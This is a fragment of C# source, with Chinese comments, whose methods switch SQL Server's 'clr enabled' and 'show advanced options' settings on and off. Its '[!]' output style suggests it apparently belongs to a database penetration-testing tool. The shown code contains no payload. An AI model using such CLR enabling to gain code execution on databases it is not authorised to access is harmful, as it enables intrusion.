            if (!Set_configuration("clr enabled", 1))
            {
                Console.WriteLine("[!] cannot enable 'clr enabled'");
                return false;
            }
            return true;
        }

        /// <summary>
        /// 关闭 clr enabled
        /// </summary>
        /// <returns>true/false</returns>
        public bool Disable_clr()
        {
            if (!Set_configuration("show advanced options", 1))
            {
                Console.WriteLine("[!] cannot enable 'show advanced options'");
                return false;
            }
            if (!Set_configuration("clr enabled", 0))
            {
                Console.WriteLine("[!] cannot disable 'clr enabled'");
                return false;
            }
            if (!Set_configuration("show advanced options", 0))
            {
                Console.WriteLine("[!] cannot disable 'show advanced options'");
                return false;
            }
            return true;
        }

        #endregion

    }
}
